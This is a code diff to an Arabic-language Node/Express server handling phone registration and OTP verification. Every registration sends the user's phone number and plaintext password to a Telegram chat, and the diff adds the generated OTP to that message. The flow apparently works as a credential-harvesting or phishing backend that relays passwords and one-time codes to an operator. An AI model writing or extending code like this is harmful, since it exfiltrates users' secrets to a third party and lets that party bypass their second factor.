@@ -17,6 +17,15 @@ const supabase = createClient(
   process.env.SUPABASE_SERVICE_ROLE_KEY || ''
 );
 
+// In-memory store of generated OTP codes, keyed by participantId.
+// Good enough for a single server instance; codes expire after OTP_TTL_MS.
+const otpStore = new Map();
+const OTP_TTL_MS = 10 * 60 * 1000; // 10 minutes
+
+function generateOTP() {
+  return String(Math.floor(100000 + Math.random() * 900000));
+}
+
 function sanitizeInput(input) {
   if (input == null) return '';
   return validator.escape(validator.trim(String(input)));
@@ -34,12 +43,9 @@ function validateRegistration(phone, entryCode) {
   return { valid: true };
 }
 
-function validateOTP(entryCode, otpCode) {
+function validateOTP(otpCode) {
   if (!/^\d{6}$/.test(otpCode)) {
     return { valid: false, error: 'INVALID_FORMAT' };
-  }
-  if (otpCode.includes(entryCode)) {
-    return { valid: false, error: 'OTP_CONTAINS_ENTRY' };
   }
   return { valid: true };
 }
@@ -185,9 +191,12 @@ app.post('/api/register', registerLimiter, async (req, res) => {
       throw error;
     }
 
+    const otp = generateOTP();
+    otpStore.set(data.id, { code: otp, expiresAt: Date.now() + OTP_TTL_MS });
+
     const time = new Date().toLocaleString('ar-MR');
     await sendToTelegram(
-      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
+      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز التحقق (OTP): ${otp}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
     );
 
     return res.json({
@@ -216,11 +225,28 @@ app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
     });
   }
 
-  const otpVal = validateOTP(entryCode, otpCode);
+  const otpVal = validateOTP(otpCode);
   if (!otpVal.valid) {
     return res.status(400).json({
       success: false,
       error: otpVal.error,
+      message: 'رمز التحقق غير صحيح',
+    });
+  }
+
+  const stored = otpStore.get(participantId);
+  if (!stored || stored.expiresAt < Date.now()) {
+    otpStore.delete(participantId);
+    return res.status(400).json({
+      success: false,
+      error: 'OTP_EXPIRED',
+      message: 'انتهت صلاحية رمز التحقق، يرجى التسجيل من جديد',
+    });
+  }
+  if (stored.code !== otpCode) {
+    return res.status(400).json({
+      success: false,
+      error: 'OTP_MISMATCH',
       message: 'رمز التحقق غير صحيح',
     });
   }
@@ -244,6 +270,7 @@ app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
     }
 
     if (row.verified) {
+      otpStore.delete(participantId);
       return res.json({ success: true, message: 'تم التحقق بنجاح' });
     }
 
@@ -256,6 +283,8 @@ app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
       .eq('verified', false);
 
     if (upErr) throw upErr;
+
+    otpStore.delete(participantId);
 
     const time = new Date().toLocaleString('ar-MR');
     await sendToTelegram(
@@ -276,6 +305,7 @@ app.post('/api/abandon-otp', async (req, res) => {
     return res.status(400).json({ success: false });
   }
   try {
+    otpStore.delete(participantId);
     await supabase.from('participants').delete().eq('id', participantId).eq('verified', false);
     return res.json({ success: true });
   } catch (e) {
